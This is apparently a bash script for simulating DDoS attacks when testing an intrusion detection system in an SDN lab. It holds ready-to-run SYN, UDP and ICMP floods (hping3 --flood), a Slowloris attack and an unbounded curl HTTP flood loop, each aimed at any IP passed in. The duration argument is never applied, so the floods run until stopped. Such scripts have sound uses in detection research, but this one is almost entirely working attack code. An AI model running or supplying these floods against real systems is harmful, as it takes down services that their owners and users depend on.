#!/bin/bash
# ============================================
# DDoS Attack Simulation Scripts
# For IDS Testing in SDN Environment
# ============================================

VICTIM_IP=${1:-"192.168.11.6"}
DURATION=${2:-60}

echo "============================================"
echo "DDoS Attack Simulation Suite"
echo "Target: $VICTIM_IP"
echo "Duration: ${DURATION}s"
echo "============================================"

case "$3" in
    "syn_flood")
        echo "[ATTACK] SYN Flood Attack"
        hping3 -S -p 80 --flood $VICTIM_IP
        ;;

    "udp_flood")
        echo "[ATTACK] UDP Flood Attack"
        hping3 --udp -p 53 --flood $VICTIM_IP
        ;;

    "icmp_flood")
        echo "[ATTACK] ICMP Flood Attack"
        hping3 --icmp --flood $VICTIM_IP
        ;;

    "slowloris")
        echo "[ATTACK] Slowloris HTTP Attack"
        slowloris $VICTIM_IP -p 80 -s 200
        ;;

    "http_flood")
        echo "[ATTACK] HTTP GET Flood"
        while true; do
            curl -s "http://$VICTIM_IP/" > /dev/null &
        done
        ;;

    *)
        echo "Usage: $0 <victim_ip> <duration> <attack_type>"
        echo ""
        echo "Attack types:"
        echo "  syn_flood   - TCP SYN Flood"
        echo "  udp_flood   - UDP Flood"
        echo "  icmp_flood  - ICMP Flood"
        echo "  slowloris   - Slowloris HTTP"
        echo "  http_flood  - HTTP GET Flood"
        ;;
esac
